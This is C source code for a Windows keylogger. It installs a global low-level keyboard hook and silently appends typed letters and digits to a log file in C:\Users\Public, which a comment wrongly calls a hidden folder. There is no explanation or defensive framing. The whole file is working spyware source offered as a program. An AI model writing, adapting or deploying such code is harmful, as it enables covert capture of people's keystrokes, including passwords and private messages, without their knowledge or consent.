#include <windows.h>
#include <stdio.h>

FILE *logfile;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
            DWORD vkCode = pKeyBoard->vkCode;

            // Simple logging of keys as characters (uppercase only)
            if (vkCode >= 0x30 && vkCode <= 0x5A) { // 0-9, A-Z
                fprintf(logfile, "%c", vkCode);
                fflush(logfile);
            } else {
                // You can add more special key handling here if you want
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {

    logfile = fopen("C:\\Users\\Public\\keylog.txt", "a+"); // Hidden folder, append mode
    if (!logfile) return 1;

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    fclose(logfile);
    return 0;
}

